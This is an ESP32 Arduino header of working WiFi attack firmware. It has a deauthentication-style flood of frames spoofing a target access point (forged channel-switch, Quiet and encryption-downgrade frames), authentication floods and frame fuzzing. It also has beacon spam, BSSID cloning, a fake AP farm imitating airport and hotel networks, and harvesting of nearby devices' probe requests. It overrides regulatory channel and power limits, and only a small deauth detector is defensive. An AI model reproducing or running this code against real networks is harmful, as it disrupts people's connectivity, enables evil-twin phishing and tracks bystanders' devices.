#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "gg_config.h"

#define GG_WIFI_SCAN_MAX 16
struct GgWifiAP {
  char    ssid[33];
  int8_t  rssi;
  uint8_t channel;
  uint8_t bssid[6];
  uint8_t enc;
};
static GgWifiAP  ggWifiAPs[GG_WIFI_SCAN_MAX];
static int        ggWifiAPCount   = 0;
static bool       ggWifiScanDone  = false;

static volatile bool     ggWifiTxRun    = false;
static volatile bool     ggWifiTxPaused = false;
static volatile uint32_t ggWifiPktCnt   = 0;
static volatile uint32_t ggWifiTxOk     = 0;
static volatile uint32_t ggWifiTxErr    = 0;
static volatile int32_t  ggWifiLastErr  = 0;
static TaskHandle_t ggWifiTxTask = nullptr;
static uint8_t           ggWifiFrame[256];
static int               ggWifiFrameLen = 0;
static volatile uint16_t ggWifiGapTicks = 1;
static uint8_t           ggWifiTxChan   = 1;

static volatile bool ggWifiDeauthMode = false;
static uint8_t       ggWifiDeauthBssid[6];
static bool          ggFloodNrfActive = false;

// WiFi channel center freq = 2412 + (ch-1)*5 MHz; nRF ch = freq - 2400
static inline uint8_t ggWifiChToNrf(uint8_t wch) {
  return (uint8_t)((wch - 1) * 5 + 12);
}

static void ggWifiBuildBeacon(uint8_t channel, const GgWifiTxCfg& cfg) {
  int maxLen = (cfg.frameSize == GG_WF_256) ? 256 : 128;
  int p = 0;
  ggWifiFrame[p++] = 0x80; ggWifiFrame[p++] = 0x00;
  ggWifiFrame[p++] = 0x00; ggWifiFrame[p++] = 0x00;
  memset(&ggWifiFrame[p], 0xFF, 6); p += 6;
  ggWifiFrame[p++] = 0xDE; ggWifiFrame[p++] = 0xAD;
  ggWifiFrame[p++] = 0xBE; ggWifiFrame[p++] = 0xEF;
  ggWifiFrame[p++] = (uint8_t)(esp_random());
  ggWifiFrame[p++] = (uint8_t)(esp_random());
  memcpy(&ggWifiFrame[p], &ggWifiFrame[10], 6); p += 6;
  ggWifiFrame[p++] = 0x00; ggWifiFrame[p++] = 0x00;
  memset(&ggWifiFrame[p], 0, 8); p += 8;
  ggWifiFrame[p++] = 0x64; ggWifiFrame[p++] = 0x00;
  ggWifiFrame[p++] = 0x21; ggWifiFrame[p++] = 0x04;
  uint8_t ssidLen = cfg.payloadLen;
  if (ssidLen > 32) ssidLen = 32;
  ggWifiFrame[p++] = 0x00; ggWifiFrame[p++] = ssidLen;
  memcpy(&ggWifiFrame[p], cfg.payload, ssidLen); p += ssidLen;
  ggWifiFrame[p++] = 0x01; ggWifiFrame[p++] = 0x08;
  const uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
  memcpy(&ggWifiFrame[p], rates, 8); p += 8;
  ggWifiFrame[p++] = 0x03; ggWifiFrame[p++] = 0x01;
  ggWifiFrame[p++] = channel;
  int pad = maxLen - p - 2;
  if (pad > 255) pad = 255;
  if (pad > 0) {
    ggWifiFrame[p++] = 0xDD; ggWifiFrame[p++] = (uint8_t)pad;
    for (int i = 0; i < pad; i++) ggWifiFrame[p++] = (uint8_t)(esp_random());
  }
  ggWifiFrameLen = p;
}

// Multi-frame flood roster: 4 attack types, all with NAV=32767µs.
// Compact frames (27-60 bytes) prevent TX buffer exhaustion during sustained ops.
#define GG_FLOOD_ROSTER 4
static uint8_t  ggFloodFrames[GG_FLOOD_ROSTER][64];
static uint8_t  ggFloodFrameLen[GG_FLOOD_ROSTER];
static uint8_t  ggFloodIdx = 0;
static uint32_t ggFloodFrameN = 0;
static uint16_t ggFloodNoMemRun = 0;
static volatile bool ggFloodRebuilding = false;

static void ggWifiBuildFloodRoster() {
  ggFloodRebuilding = true;
  // Frame 0: probe request — forces AP to generate probe response (burns AP CPU)
  {
    uint8_t* f = ggFloodFrames[0]; int p = 0;
    f[p++] = 0x40; f[p++] = 0x00;
    f[p++] = 0xFF; f[p++] = 0x7F;
    memset(&f[p], 0xFF, 6); p += 6;
    for (int i = 0; i < 6; i++) f[p++] = (uint8_t)(esp_random());
    memset(&f[p], 0xFF, 6); p += 6;
    f[p++] = 0x00; f[p++] = 0x00;
    f[p++] = 0x00; f[p++] = 0x00;
    f[p++] = 0x01; f[p++] = 0x08;
    const uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
    memcpy(&f[p], rates, 8); p += 8;
    ggFloodFrameLen[0] = p;
  }
  // Frame 1: multi-IE attack beacon spoofing target AP.
  // CSA + Extended CSA + Quiet + DS Parameter spoof, all in one beacon.
  // CSA/ECSA: tell clients to switch to wrong channel (802.11h/ac).
  // Quiet: tell clients to stop transmitting for max duration (802.11h).
  // DS Param: claim AP is already on the wrong channel.
  {
    uint8_t* f = ggFloodFrames[1]; int p = 0;
    f[p++] = 0x80; f[p++] = 0x00;
    f[p++] = 0xFF; f[p++] = 0x7F;
    memset(&f[p], 0xFF, 6); p += 6;
    memcpy(&f[p], ggWifiDeauthBssid, 6); p += 6;
    memcpy(&f[p], ggWifiDeauthBssid, 6); p += 6;
    f[p++] = 0x00; f[p++] = 0x00;
    memset(&f[p], 0, 8); p += 8;
    f[p++] = 0x64; f[p++] = 0x00;
    f[p++] = 0x31; f[p++] = 0x14;
    f[p++] = 0x00; f[p++] = 0x00;
    uint8_t csaCh = (ggWifiTxChan <= 7) ? 13 : 1;
    f[p++] = 0x03; f[p++] = 0x01; f[p++] = csaCh;
    f[p++] = 0x25; f[p++] = 0x03; f[p++] = 0x01;
    f[p++] = csaCh; f[p++] = 0x01;
    f[p++] = 0x3C; f[p++] = 0x04; f[p++] = 0x01;
    f[p++] = 0x51; f[p++] = csaCh; f[p++] = 0x01;
    f[p++] = 0x28; f[p++] = 0x06;
    f[p++] = 0x01; f[p++] = 0x00;
    f[p++] = 0xFF; f[p++] = 0xFF;
    f[p++] = 0x00; f[p++] = 0x00;
    ggFloodFrameLen[1] = p;
  }
  // Frame 2: capability-downgrade spoof — probe response from target AP's BSSID
  // but advertising no encryption. Clients see their AP "dropped WPA" and may disconnect.
  {
    uint8_t* f = ggFloodFrames[2]; int p = 0;
    f[p++] = 0x50; f[p++] = 0x00;
    f[p++] = 0xFF; f[p++] = 0x7F;
    memset(&f[p], 0xFF, 6); p += 6;
    memcpy(&f[p], ggWifiDeauthBssid, 6); p += 6;
    memcpy(&f[p], ggWifiDeauthBssid, 6); p += 6;
    f[p++] = 0x00; f[p++] = 0x00;
    memset(&f[p], 0, 8); p += 8;
    f[p++] = 0x64; f[p++] = 0x00;
    f[p++] = 0x01; f[p++] = 0x00;
    f[p++] = 0x00; f[p++] = 0x00;
    ggFloodFrameLen[2] = p;
  }
  // Frame 3: action frame (spectrum management) — a 4th frame type that defeats
  // AP filters looking for only beacon/probe. Burns AP CPU processing it.
  {
    uint8_t* f = ggFloodFrames[3]; int p = 0;
    f[p++] = 0xD0; f[p++] = 0x00;
    f[p++] = 0xFF; f[p++] = 0x7F;
    memset(&f[p], 0xFF, 6); p += 6;
    for (int i = 0; i < 6; i++) f[p++] = (uint8_t)(esp_random());
    memset(&f[p], 0xFF, 6); p += 6;
    f[p++] = 0x00; f[p++] = 0x00;
    f[p++] = 0x00; f[p++] = 0x01; f[p++] = 0x01;
    ggFloodFrameLen[3] = p;
  }
  ggFloodIdx = 0;
  ggFloodFrameN = 0;
  ggFloodNoMemRun = 0;
  ggFloodRebuilding = false;
}

static inline void ggWifiBuildFloodProbe(uint8_t channel) {
  (void)channel;
  ggWifiBuildFloodRoster();
}

// ---- Beacon Spam: flood fake SSIDs (each also carries NAV 32767µs) --------
static volatile bool ggWifiSpamMode = false;
static volatile uint32_t ggSpamCount = 0;

static const char* const GG_SPAM_NAMES[] = {
  "Free WiFi", "FBI Van", "ctOS Node",
  "DedSec", "5G Tower", "NSA Secure",
  "HP-Print", "Google Home", "xfinity",
  "NETGEAR", "TP-Link", "Ring Doorbell",
  "Chromecast"
};
#define GG_SPAM_NAME_N 13

static inline int ggWifiBuildSpamBeacon(uint8_t* f, uint8_t channel) {
  int p = 0;
  f[p++] = 0x80; f[p++] = 0x00;
  f[p++] = 0xFF; f[p++] = 0x7F;
  memset(&f[p], 0xFF, 6); p += 6;
  for (int i = 0; i < 6; i++) f[p++] = (uint8_t)(esp_random());
  memcpy(&f[p], &f[10], 6); p += 6;
  f[p++] = 0x00; f[p++] = 0x00;
  memset(&f[p], 0, 8); p += 8;
  f[p++] = 0x64; f[p++] = 0x00;
  f[p++] = 0x21; f[p++] = 0x04;
  const char* base = GG_SPAM_NAMES[esp_random() % GG_SPAM_NAME_N];
  uint8_t suf = (uint8_t)(esp_random());
  char ssid[33];
  int slen = snprintf(ssid, sizeof(ssid), "%s_%02X", base, suf);
  if (slen > 32) slen = 32;
  f[p++] = 0x00; f[p++] = (uint8_t)slen;
  memcpy(&f[p], ssid, slen); p += slen;
  f[p++] = 0x01; f[p++] = 0x08;
  const uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
  memcpy(&f[p], rates, 8); p += 8;
  f[p++] = 0x03; f[p++] = 0x01; f[p++] = channel;
  return p;
}

// ---- WiFi Rickroll: broadcast a custom message as a WiFi SSID --------
static volatile bool ggWifiRickMode = false;
static volatile uint32_t ggRickCount = 0;
static char ggRickMsg[33] = "KODI RF";
static uint8_t ggRickLen = 13;

static inline int ggWifiBuildRickBeacon(uint8_t* f, uint8_t channel) {
  int p = 0;
  f[p++] = 0x80; f[p++] = 0x00;
  f[p++] = 0xFF; f[p++] = 0x7F;
  memset(&f[p], 0xFF, 6); p += 6;
  f[p++] = 0xDE; f[p++] = 0xAD; f[p++] = 0xBE; f[p++] = 0xEF;
  f[p++] = 0x42; f[p++] = (uint8_t)(esp_random());
  memcpy(&f[p], &f[10], 6); p += 6;
  f[p++] = 0x00; f[p++] = 0x00;
  memset(&f[p], 0, 8); p += 8;
  f[p++] = 0x64; f[p++] = 0x00;
  f[p++] = 0x21; f[p++] = 0x04;
  uint8_t slen = ggRickLen;
  if (slen > 32) slen = 32;
  f[p++] = 0x00; f[p++] = slen;
  memcpy(&f[p], ggRickMsg, slen); p += slen;
  f[p++] = 0x01; f[p++] = 0x08;
  const uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
  memcpy(&f[p], rates, 8); p += 8;
  f[p++] = 0x03; f[p++] = 0x01; f[p++] = channel;
  return p;
}

// ---- Auth Flood: exhaust AP auth table with fake auth requests ----
static volatile bool ggWifiAuthFlood = false;
static volatile uint32_t ggAuthFloodCnt = 0;

static inline int ggWifiBuildAuthFrame(uint8_t* f, const uint8_t* bssid) {
  int p = 0;
  f[p++] = 0xB0; f[p++] = 0x00;
  f[p++] = 0xFF; f[p++] = 0x7F;
  memcpy(&f[p], bssid, 6); p += 6;
  for (int i = 0; i < 6; i++) f[p++] = (uint8_t)(esp_random());
  memcpy(&f[p], bssid, 6); p += 6;
  f[p++] = 0x00; f[p++] = 0x00;
  f[p++] = 0x00; f[p++] = 0x00;
  f[p++] = 0x01; f[p++] = 0x00;
  f[p++] = 0x00; f[p++] = 0x00;
  return p;
}

// ---- WiFi Fuzzer: send random/malformed frames ----
static volatile bool ggWifiFuzzMode = false;
static volatile uint32_t ggFuzzCount = 0;

static inline int ggWifiBuildFuzzFrame(uint8_t* f) {
  int len = 24 + (esp_random() % 40);
  if (len > 80) len = 80;
  for (int i = 0; i < len; i++) f[i] = (uint8_t)(esp_random());
  uint8_t types[] = {0x00, 0x40, 0x50, 0x80, 0xD0};
  f[0] = types[esp_random() % 5];
  f[1] = 0x00;
  f[2] = 0xFF; f[3] = 0x7F;
  return len;
}

// ---- Quiet Storm: 802.11h Quiet IE telling clients to shut up ----
static volatile bool ggWifiQuietMode = false;
static volatile uint32_t ggQuietCount = 0;

static inline int ggWifiBuildQuietBeacon(uint8_t* f, const uint8_t* bssid, uint8_t ch) {
  int p = 0;
  f[p++] = 0x80; f[p++] = 0x00;
  f[p++] = 0xFF; f[p++] = 0x7F;
  memset(&f[p], 0xFF, 6); p += 6;
  memcpy(&f[p], bssid, 6); p += 6;
  memcpy(&f[p], bssid, 6); p += 6;
  f[p++] = 0x00; f[p++] = 0x00;
  memset(&f[p], 0, 8); p += 8;
  f[p++] = 0x64; f[p++] = 0x00;
  f[p++] = 0x31; f[p++] = 0x14;
  f[p++] = 0x00; f[p++] = 0x00;
  f[p++] = 0x03; f[p++] = 0x01; f[p++] = ch;
  f[p++] = 0x28; f[p++] = 0x06;
  f[p++] = 0x01; f[p++] = 0x00;
  f[p++] = 0xFF; f[p++] = 0xFF;
  f[p++] = 0x00; f[p++] = 0x00;
  return p;
}

// ---- BSSID Clone: beacon spoofing exact target BSSID ----
static volatile bool ggWifiCloneMode = false;
static volatile uint32_t ggCloneCount = 0;
static uint8_t ggCloneBssid[6];
static char ggCloneSsid[33] = "";
static uint8_t ggCloneEnc = 0;

static inline int ggWifiBuildCloneBeacon(uint8_t* f, uint8_t ch) {
  int p = 0;
  f[p++] = 0x80; f[p++] = 0x00;
  f[p++] = 0xFF; f[p++] = 0x7F;
  memset(&f[p], 0xFF, 6); p += 6;
  memcpy(&f[p], ggCloneBssid, 6); p += 6;
  memcpy(&f[p], ggCloneBssid, 6); p += 6;
  f[p++] = 0x00; f[p++] = 0x00;
  memset(&f[p], 0, 8); p += 8;
  f[p++] = 0x64; f[p++] = 0x00;
  f[p++] = (ggCloneEnc > 0) ? 0x31 : 0x21; f[p++] = 0x04;
  uint8_t slen = (uint8_t)strlen(ggCloneSsid);
  if (slen > 32) slen = 32;
  f[p++] = 0x00; f[p++] = slen;
  memcpy(&f[p], ggCloneSsid, slen); p += slen;
  f[p++] = 0x01; f[p++] = 0x08;
  const uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
  memcpy(&f[p], rates, 8); p += 8;
  f[p++] = 0x03; f[p++] = 0x01; f[p++] = ch;
  return p;
}

// ---- Fake AP Farm: multiple persistent fake networks ----
static volatile bool ggWifiFarmMode = false;
static volatile uint32_t ggFarmCount = 0;
static const char* const GG_FARM_SSIDS[] = {
  "Free Airport WiFi", "Starbucks WiFi", "xfinitywifi",
  "ATT-WiFi-Passpoint", "Google Starbucks", "HPGuest",
  "CableWifi", "Marriott_Guest", "HiltonHonors",
  "Delta_Free_WiFi", "Southwest_WiFi", "United_WiFi"
};
#define GG_FARM_N 12

static inline int ggWifiBuildFarmBeacon(uint8_t* f, uint8_t ch, uint8_t idx) {
  int p = 0;
  f[p++] = 0x80; f[p++] = 0x00;
  f[p++] = 0xFF; f[p++] = 0x7F;
  memset(&f[p], 0xFF, 6); p += 6;
  f[p++] = 0xAA; f[p++] = 0xBB; f[p++] = 0xCC;
  f[p++] = 0xDD; f[p++] = idx; f[p++] = (uint8_t)(esp_random());
  memcpy(&f[p], &f[10], 6); p += 6;
  f[p++] = 0x00; f[p++] = 0x00;
  memset(&f[p], 0, 8); p += 8;
  f[p++] = 0x64; f[p++] = 0x00;
  f[p++] = 0x21; f[p++] = 0x04;
  const char* ssid = GG_FARM_SSIDS[idx % GG_FARM_N];
  uint8_t slen = (uint8_t)strlen(ssid);
  if (slen > 32) slen = 32;
  f[p++] = 0x00; f[p++] = slen;
  memcpy(&f[p], ssid, slen); p += slen;
  f[p++] = 0x01; f[p++] = 0x08;
  const uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
  memcpy(&f[p], rates, 8); p += 8;
  f[p++] = 0x03; f[p++] = 0x01; f[p++] = ch;
  return p;
}

// ---- Deauth Detect: passive monitor for deauth/disassoc frames ----
static volatile uint32_t ggDeauthDetectCnt = 0;
static volatile uint32_t ggDeauthLastMs = 0;
static bool ggDeauthDetectOn = false;
static uint8_t ggDeauthLastBssid[6];

static void ggDeauthSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if (pkt->rx_ctrl.sig_len < 16) return;
  uint8_t* f = pkt->payload;
  uint8_t subtype = f[0] & 0xFC;
  if (subtype == 0xC0 || subtype == 0xA0) {
    ggDeauthDetectCnt++;
    ggDeauthLastMs = millis();
    memcpy(ggDeauthLastBssid, &f[10], 6);
  }
}

static inline void ggDeauthDetectBegin() {
  ggDeauthDetectCnt = 0;
  ggDeauthLastMs = 0;
  memset(ggDeauthLastBssid, 0, 6);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  wifi_country_t cty = { "XX", 1, 14, 78, WIFI_COUNTRY_POLICY_MANUAL };
  esp_wifi_set_country(&cty);
  esp_wifi_set_promiscuous_rx_cb(ggDeauthSniffCb);
  esp_wifi_set_promiscuous(true);
  ggDeauthDetectOn = true;
}

static inline void ggDeauthDetectEnd() {
  if (!ggDeauthDetectOn) return;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  ggDeauthDetectOn = false;
}

static void ggWifiTxTaskFn(void*) {
  while (ggWifiTxRun) {
    if (ggWifiTxPaused) { vTaskDelay(2); continue; }

    if (ggWifiDeauthMode) {
      if (ggFloodRebuilding) { vTaskDelay(1); continue; }
      uint8_t fi = ggFloodIdx;
      uint8_t* frame = ggFloodFrames[fi];
      int flen = ggFloodFrameLen[fi];
      if (fi == 0 || fi == 3) {
        for (int i = 0; i < 6; i++) frame[10+i] = (uint8_t)(esp_random());
      }
      esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, frame, flen, true);
      if (rc == ESP_OK) {
        ggWifiPktCnt++; ggWifiTxOk++;
        ggFloodIdx = (fi + 1) % GG_FLOOD_ROSTER;
        ggFloodNoMemRun = 0;
        ggFloodFrameN++;
        vTaskDelay(1);
      }
      else if (rc == ESP_ERR_NO_MEM) {
        if (++ggFloodNoMemRun > 100) { vTaskDelay(8); ggFloodNoMemRun = 0; }
        else vTaskDelay(2);
        continue;
      }
      else {
        ggWifiLastErr = (int32_t)rc;
        ggWifiTxErr++;
        ggFloodIdx = (fi + 1) % GG_FLOOD_ROSTER;
        vTaskDelay(2);
      }
    } else if (ggWifiSpamMode) {
      uint8_t spf[80];
      int spl = ggWifiBuildSpamBeacon(spf, ggWifiTxChan);
      esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, spf, spl, true);
      if (rc == ESP_OK) { ggWifiPktCnt++; ggWifiTxOk++; ggSpamCount++; vTaskDelay(1); }
      else if (rc == ESP_ERR_NO_MEM) { vTaskDelay(4); }
      else { ggWifiLastErr = (int32_t)rc; ggWifiTxErr++; vTaskDelay(2); }
    } else if (ggWifiRickMode) {
      uint8_t rf[100];
      int rl = ggWifiBuildRickBeacon(rf, ggWifiTxChan);
      esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, rf, rl, true);
      if (rc == ESP_OK) { ggWifiPktCnt++; ggWifiTxOk++; ggRickCount++; vTaskDelay(1); }
      else if (rc == ESP_ERR_NO_MEM) { vTaskDelay(4); }
      else { ggWifiLastErr = (int32_t)rc; ggWifiTxErr++; vTaskDelay(2); }
    } else if (ggWifiAuthFlood) {
      uint8_t af[30];
      int al = ggWifiBuildAuthFrame(af, ggWifiDeauthBssid);
      esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, af, al, true);
      if (rc == ESP_OK) { ggWifiPktCnt++; ggWifiTxOk++; ggAuthFloodCnt++; vTaskDelay(1); }
      else if (rc == ESP_ERR_NO_MEM) { vTaskDelay(2); }
      else { ggWifiLastErr = (int32_t)rc; ggWifiTxErr++; vTaskDelay(2); }
    } else if (ggWifiFuzzMode) {
      uint8_t ff[80];
      int fl = ggWifiBuildFuzzFrame(ff);
      esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, ff, fl, true);
      if (rc == ESP_OK) { ggWifiPktCnt++; ggWifiTxOk++; ggFuzzCount++; vTaskDelay(1); }
      else if (rc == ESP_ERR_NO_MEM) { vTaskDelay(2); }
      else { ggWifiLastErr = (int32_t)rc; ggWifiTxErr++; vTaskDelay(1); }
    } else if (ggWifiQuietMode) {
      uint8_t qf[64];
      int ql = ggWifiBuildQuietBeacon(qf, ggWifiDeauthBssid, ggWifiTxChan);
      esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, qf, ql, true);
      if (rc == ESP_OK) { ggWifiPktCnt++; ggWifiTxOk++; ggQuietCount++; vTaskDelay(1); }
      else if (rc == ESP_ERR_NO_MEM) { vTaskDelay(2); }
      else { ggWifiLastErr = (int32_t)rc; ggWifiTxErr++; vTaskDelay(2); }
    } else if (ggWifiCloneMode) {
      uint8_t cf[100];
      int cl = ggWifiBuildCloneBeacon(cf, ggWifiTxChan);
      esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, cf, cl, true);
      if (rc == ESP_OK) { ggWifiPktCnt++; ggWifiTxOk++; ggCloneCount++; vTaskDelay(1); }
      else if (rc == ESP_ERR_NO_MEM) { vTaskDelay(2); }
      else { ggWifiLastErr = (int32_t)rc; ggWifiTxErr++; vTaskDelay(2); }
    } else if (ggWifiFarmMode) {
      for (uint8_t fi = 0; fi < GG_FARM_N; fi++) {
        uint8_t ff[100];
        int fl = ggWifiBuildFarmBeacon(ff, ggWifiTxChan, fi);
        esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, ff, fl, true);
        if (rc == ESP_OK) { ggWifiPktCnt++; ggWifiTxOk++; ggFarmCount++; }
        else if (rc == ESP_ERR_NO_MEM) { vTaskDelay(2); break; }
        else { ggWifiLastErr = (int32_t)rc; ggWifiTxErr++; }
      }
      vTaskDelay(1);
    } else {
      ggWifiFrame[14] = (uint8_t)(esp_random());
      ggWifiFrame[15] = (uint8_t)(esp_random());
      ggWifiFrame[20] = ggWifiFrame[14];
      ggWifiFrame[21] = ggWifiFrame[15];
      esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, ggWifiFrame, ggWifiFrameLen, true);
      if (rc == ESP_OK) { ggWifiPktCnt++; ggWifiTxOk++; }
      else {
        ggWifiLastErr = (int32_t)rc;
        vTaskDelay(2);
        rc = esp_wifi_80211_tx(WIFI_IF_AP, ggWifiFrame, ggWifiFrameLen, true);
        if (rc == ESP_OK) { ggWifiPktCnt++; ggWifiTxOk++; }
        else ggWifiTxErr++;
      }
      vTaskDelay(ggWifiGapTicks);
    }
  }
  ggWifiTxRun = false;
  while (true) vTaskDelay(portMAX_DELAY);
}

static inline void ggWifiTxBegin(const GgWifiTxCfg& cfg) {
  int8_t txp;
  switch (cfg.power) {
    case GG_WP_LOW:  txp = 8;  break;
    case GG_WP_MED:  txp = 44; break;
    case GG_WP_HIGH: txp = 68; break;
    default:         txp = 78; break;
  }
  uint8_t safeCh = cfg.channel;
  if (safeCh < 1) safeCh = 1;
  if (safeCh > 14) safeCh = 14;
  WiFi.mode(WIFI_AP);
  delay(100);
  wifi_country_t cty = { "XX", 1, 14, 78, WIFI_COUNTRY_POLICY_MANUAL };
  esp_wifi_set_country(&cty);
  WiFi.softAP("G", NULL, safeCh, 1);
  delay(100);
  esp_wifi_set_promiscuous(true);
  delay(10);
  esp_wifi_set_channel(safeCh, WIFI_SECOND_CHAN_NONE);
  delay(10);
  esp_wifi_set_max_tx_power(txp);
  ggWifiTxChan = safeCh;
  if (ggWifiDeauthMode) ggWifiBuildFloodRoster();
  else if (!ggWifiSpamMode && !ggWifiRickMode) ggWifiBuildBeacon(safeCh, cfg);
  uint16_t pps = cfg.pps;
  if (pps < 10) pps = 10;
  if (pps > 1000) pps = 1000;
  ggWifiGapTicks = 1000 / pps;
  if (ggWifiGapTicks < 1) ggWifiGapTicks = 1;
  ggWifiPktCnt = 0;
  ggWifiTxOk   = 0;
  ggWifiTxErr  = 0;
  ggWifiLastErr = 0;
  ggWifiTxRun  = true;
  if (!ggWifiTxTask)
    xTaskCreatePinnedToCore(ggWifiTxTaskFn, "wftx", 8192, NULL, 1, &ggWifiTxTask, 0);
}

static inline void ggWifiTxSetChannel(uint8_t ch, const GgWifiTxCfg& cfg) {
  if (ch < 1) ch = 1;
  if (ch > 14) ch = 14;
  ggWifiTxChan = ch;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  if (ggWifiDeauthMode) ggWifiBuildFloodRoster();
  else if (!ggWifiSpamMode && !ggWifiRickMode) ggWifiBuildBeacon(ch, cfg);
}

static inline void ggWifiTxEnd() {
  ggWifiTxRun = false;
  ggWifiTxPaused = false;
  ggWifiDeauthMode = false;
  ggWifiSpamMode = false;
  ggWifiRickMode = false;
  ggWifiAuthFlood = false;
  ggWifiFuzzMode = false;
  ggWifiQuietMode = false;
  ggWifiCloneMode = false;
  ggWifiFarmMode = false;
  if (ggWifiTxTask) {
    delay(50);
    TaskHandle_t h = ggWifiTxTask;
    if (h) { ggWifiTxTask = nullptr; vTaskDelete(h); }
  }
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
}

// ---- Probe Harvester: passive sniff of probe request SSIDs ----
// Listens in promiscuous mode for probe requests from nearby devices,
// revealing what WiFi networks they're searching for (Aiden's Profiler).
#define GG_PROBE_MAX 16
static char     ggProbeSSIDs[GG_PROBE_MAX][22];
static uint8_t  ggProbeCounts[GG_PROBE_MAX];
static volatile int ggProbeN     = 0;
static volatile int ggProbeTotal = 0;
static bool     ggProbeActive = false;

static void ggProbeSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  int plen = pkt->rx_ctrl.sig_len;
  if (plen < 28) return;
  uint8_t* f = pkt->payload;
  if ((f[0] & 0xFC) != 0x40) return;
  int off = 24, end = plen;
  while (off + 2 <= end) {
    uint8_t id = f[off], tl = f[off + 1];
    if (off + 2 + tl > end) break;
    if (id == 0x00 && tl > 0 && tl <= 32) {
      char ssid[33];
      memcpy(ssid, &f[off + 2], tl); ssid[tl] = '\0';
      for (int i = 0; i < ggProbeN; i++) {
        if (strncmp(ggProbeSSIDs[i], ssid, 21) == 0) {
          if (ggProbeCounts[i] < 255) ggProbeCounts[i]++;
          ggProbeTotal++;
          return;
        }
      }
      if (ggProbeN < GG_PROBE_MAX) {
        strncpy(ggProbeSSIDs[ggProbeN], ssid, 21);
        ggProbeSSIDs[ggProbeN][21] = '\0';
        ggProbeCounts[ggProbeN] = 1;
        ggProbeN++;
      }
      ggProbeTotal++;
      return;
    }
    off += 2 + tl;
  }
}

static inline void ggProbeBegin() {
  ggProbeN = 0; ggProbeTotal = 0;
  memset(ggProbeSSIDs, 0, sizeof(ggProbeSSIDs));
  memset(ggProbeCounts, 0, sizeof(ggProbeCounts));
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  wifi_country_t cty = { "XX", 1, 14, 78, WIFI_COUNTRY_POLICY_MANUAL };
  esp_wifi_set_country(&cty);
  esp_wifi_set_promiscuous_rx_cb(ggProbeSniffCb);
  esp_wifi_set_promiscuous(true);
  ggProbeActive = true;
}

static inline void ggProbeEnd() {
  if (!ggProbeActive) return;
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  ggProbeActive = false;
}

static inline void ggProbeSetChannel(uint8_t ch) {
  if (ggProbeActive) esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

// ---- network scan for the picker screen ----
static inline void ggWifiPickScanBegin() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  wifi_country_t cty = { "XX", 1, 14, 78, WIFI_COUNTRY_POLICY_MANUAL };
  esp_wifi_set_country(&cty);
  ggWifiScanDone = false;
  ggWifiAPCount  = 0;
  WiFi.scanNetworks(true, true);
}
static inline bool ggWifiPickScanPoll() {
  if (ggWifiScanDone) return true;
  int n = WiFi.scanComplete();
  if (n < 0) return false;
  ggWifiAPCount = 0;
  for (int i = 0; i < n && ggWifiAPCount < GG_WIFI_SCAN_MAX; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) continue;
    GgWifiAP& ap = ggWifiAPs[ggWifiAPCount];
    ssid.toCharArray(ap.ssid, sizeof(ap.ssid));
    ap.rssi    = (int8_t)WiFi.RSSI(i);
    ap.channel = WiFi.channel(i);
    const uint8_t* bptr = WiFi.BSSID(i);
    if (bptr) memcpy(ap.bssid, bptr, 6);
    else memset(ap.bssid, 0, 6);
    ap.enc     = (uint8_t)WiFi.encryptionType(i);
    ggWifiAPCount++;
  }
  WiFi.scanDelete();
  ggWifiScanDone = true;
  return true;
}
static inline void ggWifiPickScanEnd() {
  WiFi.scanDelete();
  WiFi.mode(WIFI_OFF);
  delay(100);
}
